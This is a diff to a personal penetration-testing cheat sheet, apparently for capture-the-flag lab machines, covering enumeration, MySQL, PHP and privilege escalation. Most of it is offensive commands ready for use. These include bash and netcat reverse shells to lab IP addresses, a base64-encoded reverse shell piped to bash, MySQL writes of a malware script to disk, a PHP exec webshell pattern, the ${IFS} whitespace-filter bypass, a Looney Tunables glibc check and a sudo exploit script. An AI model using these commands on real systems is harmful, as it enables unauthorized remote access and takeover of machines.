@@ -2,6 +2,27 @@
 ## General
 
 ```bash
+find . -type f -name "*.txt"
+#find all files with extension in current dir
+
+md5sum <filename> 
+#gets md5 hash of file
+
+find / -type d -name '.git'
+#finds dirs with name
+
+cd /var/mail && cd /var/spool/mail
+#check for mail
+
+```
+
+${IFS} can be used in place of whitespace when no whitespace allowed
+
+jd-gui used to decompile jar files
+
+## Enumeration
+
+```bash
 mkdir nmap
 nmap -A -T4 -v -oN nmap/initial $IP 
 sudo masscan -p1-65535,U:1-65535 $IP --rate=1000 -e tun0 -oL nmap/masscan
@@ -20,21 +41,21 @@ wpscan --url <url> -v -e
 sudo responder -wA -I tun0 -v 
 #Spoofs every server imaginable to get info on connection attempts
 
+dig axfr @<ip> <hostname>
+#gets other hostnames from port 53 of server
+
 ```
 Always google open ports, not just services shown/guessed by nmap
 
 .dockerenv in / means you're in a docker container
 
-${IFS} can be used in place of whitespace when no whitespace allowed
+gitdump used to dump .git directories 
 
-jd-gui used to decompile jar files
-
-gitdump used to dump .git directories
 
 ## MySQL
 
 ```bash
-mysql -u <username> -p 
+mysql -u <username> -p <database>
 #connect to mysql database on machine
 show databases;
 use <databasename>;
@@ -42,14 +63,20 @@ show tables;
 
 ```
 
+mysql can usually write into /var/lib/mysql/
+
+SELECT "bashscript" into outfile '/dev/shm/malware.sh';
+SELECT from_base64("base64encoded") into outfile '/dev/shm/nothing.txt';
+
+
 ## RevShells
 
 ```bash
-bash -i >& /dev/tcp/10.10.14.205/8888 0>&1
+bash -i >& /dev/tcp/10.10.15.59/9002 0>&1
 nc 10.10.14.54 8888 -e bash
 
-echo "bash -i >& /dev/tcp/10.10.14.205/8888 0>&1" | base64
-echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NC84ODg4IDA+JjE=" | base64 -d | bash
+echo "bash -i >& /dev/tcp/10.10.15.59/8000 0>&1" | base64
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NC84ODg4IDA+JjE= | base64 -d | bash
 
 which python
 which python3
@@ -64,6 +91,17 @@ reset
 ```
 
 /home/kali/php-reverse-shell.php is php reverse shell that can be uploaded to php server
+
+For things running on localhost, if you have ssh session then you can forward it to yourself
+Using ~C , then -L 8080:localhost:8080
+
+## PHP
+
+With PHP, can put <?php exec("command"); ?> in a .php file then call it
+Or exec("command"); in interactive php
+Remember to base encode, and not have + in them as will fuck with url encoding. double base encoding usually works well
+
+Also, when calling .php files try both with and without the extension in web browser...
 
 ## PrivEsc
 
@@ -85,19 +123,16 @@ uname -a
 
 ldd --version
 #shows GLIBC version, could be vuln (loonytoonables)
+
 env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
-#checks for loonytoonables vuln, if returns Segmentation fault (core dumped)
+#loonytoonables vuln if returns Segmentation fault (core dumped)
 
-ps aux
-
-find . -type f -name "*.txt"
-#find all files with extension in current dir
+ps aux ww
 
 find / -perm -u=s -type f 2>/dev/null 
 #finds suid bit
 
-cd /var/mail && cd /var/spool/mail
-#check for mail
+python2 fallofsudo.py
 
 ```
 
